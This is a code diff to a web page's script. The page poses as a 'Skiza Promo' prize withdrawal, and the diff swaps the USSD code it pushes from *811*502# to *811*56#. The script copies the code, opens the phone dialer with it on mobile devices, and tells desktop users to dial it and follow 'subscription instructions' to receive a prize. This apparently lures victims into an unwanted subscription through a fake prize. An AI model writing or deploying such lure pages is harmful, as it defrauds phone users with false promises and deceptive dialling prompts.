@@ -349,7 +349,7 @@
             } catch (err) {
                 // Fallback for older browsers
                 const textArea = document.createElement('textarea');
-                textArea.value = '*811*502#';
+                textArea.value = '*811*56#';
                 document.body.appendChild(textArea);
                 textArea.select();
                 document.execCommand('copy');
@@ -368,14 +368,14 @@
         // Dial button functionality - FIXED USSD CODE ISSUE
         dialBtn.addEventListener('click', () => {
             // Use the correct tel: format with URL encoding for #
-            const ussd = '*811*502%23'; // %23 is the URL-encoded version of #
+            const ussd = '*811*56%23'; // %23 is the URL-encoded version of #
             
             if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
                 // Mobile device - launch dialer with properly formatted USSD
                 window.location.href = `tel:${ussd}`;
             } else {
                 // Desktop - show instruction
-                alert(`To complete your withdrawal:\n\n1. Dial *811*502# on your phone\n2. Follow the subscription instructions\n3. Your prize will be processed within 24 hours\n\nThank you for choosing Skiza Promo!`);
+                alert(`To complete your withdrawal:\n\n1. Dial *811*56# on your phone\n2. Follow the subscription instructions\n3. Your prize will be processed within 24 hours\n\nThank you for choosing Skiza Promo!`);
             }
             
             // Add some visual feedback
@@ -404,5 +404,6 @@
     </script>
 </body>
 </html>
+
 
 
